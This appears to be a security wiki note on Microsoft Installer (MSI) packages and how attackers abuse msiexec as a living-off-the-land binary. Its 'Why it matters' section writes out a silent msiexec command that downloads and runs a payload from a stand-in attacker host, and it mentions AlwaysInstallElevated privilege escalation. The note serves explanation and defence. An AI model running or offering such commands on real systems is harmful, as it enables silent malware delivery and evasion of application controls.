# MSI

## What it is
Like a self-extracting blueprint that tells Windows exactly how to assemble a house — where to place files, which registry keys to write, which services to start — an MSI (Microsoft Installer) package is a structured database file (.msi) that Windows Installer uses to deploy, modify, or remove software in a standardized, transactional way.

## Why it matters
Attackers abuse MSI files as a Living-off-the-Land (LotL) technique: `msiexec.exe /quiet /i https://evil.com/payload.msi` silently downloads and executes a malicious installer over HTTPS, bypassing application whitelisting controls that trust the signed `msiexec.exe` binary. This technique was used in real campaigns delivering Cobalt Strike beacons and RATs while evading endpoint detection that didn't inspect MSI contents or flag outbound msiexec network calls.

## Key facts
- MSI files are **OLE Compound Document** databases containing tables, streams, and embedded cabinet (.cab) files — not simple executables, which is why some AV solutions historically missed malicious payloads inside them
- `msiexec.exe` is a **trusted Windows binary**, making it a common LOLBin; the `/quiet` and `/passive` flags suppress user prompts during malicious installs
- Windows Installer enforces **elevated privileges** for certain MSI operations, making misconfigured `AlwaysInstallElevated` Group Policy a classic **privilege escalation** vector (CVE-style: any user can install as SYSTEM)
- **Digital signatures** on MSI packages can be verified via `Get-AuthenticodeSignature` — unsigned MSIs from untrusted sources are a red flag
- MSI transforms (`.mst` files) modify installer behavior at runtime, and attackers can supply malicious transforms to alter even legitimate, signed MSI packages

## Related concepts
[[Living off the Land (LotL)]] [[AlwaysInstallElevated]] [[Code Signing]] [[Msiexec Abuse]] [[Windows Installer]]